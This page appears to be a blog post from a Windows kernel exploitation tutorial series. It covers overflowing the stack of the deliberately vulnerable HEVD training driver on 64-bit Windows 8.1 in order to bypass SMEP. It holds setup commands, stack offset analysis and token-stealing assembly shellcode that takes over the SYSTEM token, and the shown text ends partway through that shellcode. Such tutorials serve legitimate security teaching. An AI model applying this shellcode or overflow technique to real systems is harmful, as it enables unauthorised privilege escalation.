@@ -1,0 +1,1271 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Jeremy&#39;s Blog - Windows Drivers Series Part 8 - Bypassing SMEP</title>
+<meta property="og:title" content=Jeremy&#39;s&#32;Blog&#32;-&#32;Windows&#32;Drivers&#32;Series&#32;Part&#32;8&#32;-&#32;Bypassing&#32;SMEP />
+<meta name="twitter:title" content=Jeremy&#39;s&#32;Blog&#32;-&#32;Windows&#32;Drivers&#32;Series&#32;Part&#32;8&#32;-&#32;Bypassing&#32;SMEP />
+<meta itemprop="name" content=Jeremy&#39;s&#32;Blog&#32;-&#32;Windows&#32;Drivers&#32;Series&#32;Part&#32;8&#32;-&#32;Bypassing&#32;SMEP />
+<meta name="application-name" content=Jeremy&#39;s&#32;Blog&#32;-&#32;Windows&#32;Drivers&#32;Series&#32;Part&#32;8&#32;-&#32;Bypassing&#32;SMEP />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/" />
+<link rel="canonical" href="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/" itemprop="url" />
+<meta name="url" content="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/" />
+<meta name="twitter:url" content="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/" />
+<meta property="og:url" content="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/" />
+
+
+<meta property="og:updated_time" content="2025-08-19T21:45:44-04:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://stolenfootball.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.141.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://stolenfootball.github.io/">
+                <img src="/images/avatar.png" alt="brand image">
+            </a>
+        
+        
+            <a href="https://stolenfootball.github.io/">
+                <h1>Jeremy&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    By the way - is there anyone on board who knows how to fly a plane?
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/stolenfootball">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/jeremy-dunn-a0b945172/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="https://discordapp.com/users/stolenfootball#3265">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="mailto:jeremy.dunn315@gmail.com">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="Signal" href="https://signal.me/#eu/ikkgt8MQoJBTjgrVAOrULsPwxu8mSjGsPrW-GDGj5euZreghZMlJUb91ncEA4LQr">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.4em" viewBox="0 0 1024 1024">
+            <path fill="currentColor" d="M427.5,170.3l7.9,32A319.6,319.6,0,0,0,347,238.9l-16.9-28.3A347.6,347.6,0,0,1,427.5,170.3Zm169,0-7.9,32A319.6,319.6,0,0,1,677,238.9l17.1-28.3A350.1,350.1,0,0,0,596.5,170.3ZM210.6,330a349.5,349.5,0,0,0-40.3,97.5l32,7.9A319.6,319.6,0,0,1,238.9,347ZM193,512a318.5,318.5,0,0,1,3.6-47.8l-32.6-5a352,352,0,0,0,0,105.5l32.6-4.9A319.5,319.5,0,0,1,193,512ZM693.9,813.3,677,785.1a317.8,317.8,0,0,1-88.3,36.6l7.9,32A350.3,350.3,0,0,0,693.9,813.3ZM831,512a319.5,319.5,0,0,1-3.6,47.8l32.6,4.9a352,352,0,0,0,0-105.5l-32.6,5A318.5,318.5,0,0,1,831,512Zm22.7,84.4-32-7.9A319,319,0,0,1,785.1,677l28.3,17A348.9,348.9,0,0,0,853.7,596.4Zm-293.9,231a319.1,319.1,0,0,1-95.6,0L459.3,860a351.3,351.3,0,0,0,105.4,0Zm209-126.2a318.1,318.1,0,0,1-67.6,67.5l19.6,26.6A355.1,355.1,0,0,0,795.4,721Zm-67.6-446a318.6,318.6,0,0,1,67.6,67.6L795.4,303A354.6,354.6,0,0,0,721,228.6Zm-446,67.6a318.6,318.6,0,0,1,67.6-67.6L303,228.6A354.6,354.6,0,0,0,228.6,303ZM813.4,330l-28.3,17a317.8,317.8,0,0,1,36.6,88.3l32-7.9A348.9,348.9,0,0,0,813.4,330ZM464.2,196.6a319.1,319.1,0,0,1,95.6,0l4.9-32.6a351.3,351.3,0,0,0-105.4,0ZM272.1,804.1,204,819.9l15.9-68.1-32.1-7.5-15.9,68.1a33,33,0,0,0,24.6,39.7,34.5,34.5,0,0,0,15,0l68.1-15.7Zm-77.5-89.2,32.2,7.4,11-47.2a316.2,316.2,0,0,1-35.5-86.6l-32,7.9a353.3,353.3,0,0,0,32.4,83.7Zm154,71.4-47.2,11,7.5,32.2,34.7-8.1a349,349,0,0,0,83.7,32.4l7.9-32a316.7,316.7,0,0,1-86.3-35.7ZM512,226c-158,.1-285.9,128.2-285.9,286.1a286.7,286.7,0,0,0,43.9,152L242.5,781.5,359.8,754c133.7,84.1,310.3,44,394.4-89.6S798.3,354.2,664.7,270A286.7,286.7,0,0,0,512,226s"/>
+        </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/">Windows Drivers Series Part 8 - Bypassing SMEP</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-08-19T21:45:44-0400" class="post-date">
+        August 19, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>28 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-series">
+        <a href="https://stolenfootball.github.io/tags/series">series</a>
+      </li>
+      
+      <li class="tag-pwn">
+        <a href="https://stolenfootball.github.io/tags/pwn">pwn</a>
+      </li>
+      
+      <li class="tag-rev">
+        <a href="https://stolenfootball.github.io/tags/rev">rev</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="https://stolenfootball.github.io/tags/windows">windows</a>
+      </li>
+      
+      <li class="tag-drivers">
+        <a href="https://stolenfootball.github.io/tags/drivers">drivers</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p>Continuing on from the <a href="https://stolenfootball.github.io/posts/series/windows_drivers/p7_buffer_overflow_win7/" target="_blank">last post</a>, it&rsquo;s time to make two big changes.  We&rsquo;re moving from Windows 7 to Windows 8.1, and we&rsquo;re moving from x86 to x64.</p>
+<p>Like before, Windows 8.1 isn&rsquo;t necessarily just available for download, so I&rsquo;m providing a link to the ISO hosted on my Google Drive <a href="https://drive.google.com/drive/folders/1BqItKuSwl1NkQibBXcaDUzoJjv1G2QzQ?usp=sharing" target="_blank">here</a>.</p>
+<p>We&rsquo;ll be using the same bug from the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank">HackSysExtremeVulnerableDriver</a> as last time, just modifying it to work on 64 bit Windows 8.1.  If you want to read more about the bug, please see the last post.</p>
+<h2 id="setup">Setup</h2>
+<p>These steps should all be familiar by this point, so I&rsquo;m going to go through them fast.</p>
+<p>First, install the VM and set up debugging.  I&rsquo;d recommend using the network debugging instructions from my <a href="https://stolenfootball.github.io/posts/research/2025/windows_kernel_debugger/" target="_blank">kernel debugger setup post</a> for this one.  You can use modern WinDbg too, which is nice.</p>
+<p>Enable Test Signing on the VM so the driver loads.  Reboot the VM after running the command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>bcdedit /set testsigning on
+</span></span></code></pre></div><p>Install the 64 bit version of <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases/tag/v3.00" target="_blank">HEVD</a> on the VM.  Make sure you use the one in the <code>\driver\vulnerable\x64</code> directory.  You can install and start the service with the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc create HEVD type= kernel start= auto binPath= C:\Users\stolenfootball\Desktop\HEVD.sys
+</span></span></code></pre></div><p>And then:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>sc start HEVD
+</span></span></code></pre></div><p>Decompile the 64 bit version of the driver in IDA.  Don&rsquo;t be lazy with this part, you&rsquo;ll regret it later.  Find the <code>TriggerBufferOverflowStack</code> function, and make sure it looks more or less like the following:</p>
+<p><img src="./images/1_decompiled_vuln.png" alt="Decompiled vuln"></p>
+<p>Set the line prefixes to show up in graph mode, then synchronize the assembly and the pseudocode.</p>
+<p>Now find the base address the driver is loaded at in the VM with the <code>!lmi</code> command, and rebase the program in IDA.</p>
+<p>Finally, take a snapshot of the VM at this point to work off of.</p>
+<h2 id="rev-the-vulnerable-function">Rev the vulnerable function</h2>
+<p>Let&rsquo;s write a quick program to exercise the vulnerable IOCTL without triggering the overflow so we can check the stack offsets.  An example of such a program is in the last post, so I&rsquo;m not going to reproduce it here.</p>
+<p>Make sure to compile with the following in the Visual Studio 2022 Developer Command Prompt so you get a 64 bit program.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>cl exploit.c
+</span></span></code></pre></div><p>Set a breakpoint just before the <code>memmove</code> in <code>TriggerBufferOverflowStack</code>, then run the program.</p>
+<blockquote>
+<p>Before looking at the assembly for this function, it&rsquo;s worth looking at the <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170" target="_blank">Windows x64 calling convention documentation</a>, and <a href="https://learn.microsoft.com/en-us/cpp/build/x64-software-conventions?view=msvc-170" target="_blank">reviewing the ABI in general</a>.  A shorter quick explanation of the x64 fastcall calling convention by Raymond Chen I really like can be found <a href="https://devblogs.microsoft.com/oldnewthing/20040114-00/?p=41053" target="_blank">here</a> as well.</p>
+</blockquote>
+<p>At the assembly just before <code>memmove</code> in IDA, we can see that a pointer to <code>KernelBuffer</code> is loaded into <code>rcx</code>.  IDA lables this <code>UserBuffer</code> because <code>UserBuffer</code> was passed in through <code>rcx</code> as an argument, but at this point in the program, <code>UserBuffer</code> is actually in <code>rdi</code>.  This instruction loads a pointer to <code>KernelBuffer</code> into <code>rcx</code>.</p>
+<p><img src="./images/2_pre_memmove.png" alt="User buffer"></p>
+<p>Interestingly in this case, I think it&rsquo;s a bit clearer in WinDbg.</p>
+<p><img src="./images/3_windbg_decompile.png" alt="Windbg version"></p>
+<p>Regardless, we want to overflow from the start of the <code>KernelBuffer</code> to the return address.  The Windows x64 ABI <a href="https://www.brendangregg.com/blog/2024-03-17/the-return-of-the-frame-pointers.html" target="_blank">doesn&rsquo;t use base pointers</a> which slightly complicates the matter, but we can still tell what&rsquo;s happening by looking at the function prologue.</p>
+<p><img src="./images/4_function_prologue.png" alt="Function prologue"></p>
+<p>First, there are three callee registers saved(<code>r12</code>, <code>r14</code>, and <code>r15</code>), for a total of <code>0x18</code> (3 * 8) bytes.  Then the prologue makes <code>0x820</code> bytes worth of space on the stack.  Given that <code>KernelBuffer</code> is at <code>rsp+0x20</code> according to the WinDbg disassembly, it seems as though there should be <code>0x818</code> bytes between the <code>KernelBuffer</code> and the return address.</p>
+<p><img src="./images/5_stack_diagram.png" alt="Stack diagram"></p>
+<p>This means two things:</p>
+<ul>
+<li>If we write <code>0x820</code> bytes to the <code>KernelBuffer</code>, the last 8 bytes should overwrite the return address.  There&rsquo;s no saved <code>rbp</code> here, base pointers aren&rsquo;t used.</li>
+<li>We will need to reset those callee saved registers later because we&rsquo;ll end up clobbering them.</li>
+</ul>
+<p>Modify the program to write <code>0x820</code> bytes of <code>A</code>, and make sure that the last 8 bytes only are set to <code>B</code>.  Again, an example of this is in the last post so I&rsquo;m not going to reproduce it here.</p>
+<p>If we run this, we&rsquo;ll get a crash in WinDbg.  Run <code>!analyze -v</code> to analyze the crash, and we get some interesting information.</p>
+<p><img src="./images/6_windbg_output.png" alt="WinDbg Output"></p>
+<p>The three registers we thought would be clobbered are set to all <code>A</code>, which is exactly what we expected.  In addition, the top value on the stack (which is the return address) is set to all <code>B</code> at the time of the crash.  Looks like our assumptions above were correct.</p>
+<h2 id="modify-the-exploit-for-x64">Modify the exploit for x64</h2>
+<p>The exploit will be more or less the same as the one outlined in the <a href="https://stolenfootball.github.io/posts/series/windows_drivers/p7_buffer_overflow_win7/" target="_blank">last post</a>, but there are a couple of significant changes we&rsquo;ll need to make for 64 bit Windows.</p>
+<p>First, the 64 bit VCC compiler does not allow for inline assembly.  This means we&rsquo;re back to the trusty method of compiling our shellcode with <a href="https://www.nasm.us/" target="_blank">NASM</a> and saving it in the program as a byte string.</p>
+<blockquote>
+<p>It&rsquo;s actually possible to write all of the shellcode in C, which makes it a bit more stable and easy to look at.  However, there&rsquo;s enough complexity there that it&rsquo;s worthy of its own post, so I&rsquo;m going to stick with the assembly version for the moment.</p>
+</blockquote>
+<p>Here is the token stealing shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Windows 8.1 Token Stealing Shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Author: @stolenfootball
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Website: https://stolenfootball.github.io
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">BITS</span> <span style="color:#ae81ff">64</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">define</span> <span style="color:#66d9ef">SYSTEM_PID</span>      <span style="color:#ae81ff">0x4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">define</span> <span style="color:#66d9ef">KTHREAD_OFFSET</span>  <span style="color:#ae81ff">0x188</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">define</span> <span style="color:#66d9ef">EPROCESS_OFFSET</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">define</span> <span style="color:#66d9ef">FLINK_OFFSET</span>    <span style="color:#ae81ff">0x2e8</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">define</span> <span style="color:#66d9ef">PID_OFFSET</span>      <span style="color:#ae81ff">0x2e0</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">define</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>    <span style="color:#ae81ff">0x348</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>                            <span style="color:#75715e">; Save register state
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Start of Token Stealing Stub 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">gs</span>:<span style="color:#66d9ef">KTHREAD_OFFSET</span>]        <span style="color:#75715e">; Get KTHREAD of current thread 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">EPROCESS_OFFSET</span>]    <span style="color:#75715e">; Get current EPROCESS from KTHREAD
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">rax</span>                        <span style="color:#75715e">; Store current EPROCESS pointer in rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    __search_system_pid_loop:
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, [<span style="color:#66d9ef">rax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">FLINK_OFFSET</span>]   <span style="color:#75715e">; Get the next active process in the list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">FLINK_OFFSET</span>           <span style="color:#75715e">; Go to the start of the EPROCESS struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rcx</span>, [<span style="color:#66d9ef">rax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">PID_OFFSET</span>]     <span style="color:#75715e">; Put the PID of this process into rcx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">SYSTEM_PID</span>             <span style="color:#75715e">; Compare the PID of the process to SYSTEM
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">__search_system_pid_loop</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rcx</span>, [<span style="color:#66d9ef">rax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>]       <span style="color:#75715e">; Get a pointer to SYSTEM token
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">and</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0xf0</span>                        <span style="color:#75715e">; Clear the reference count
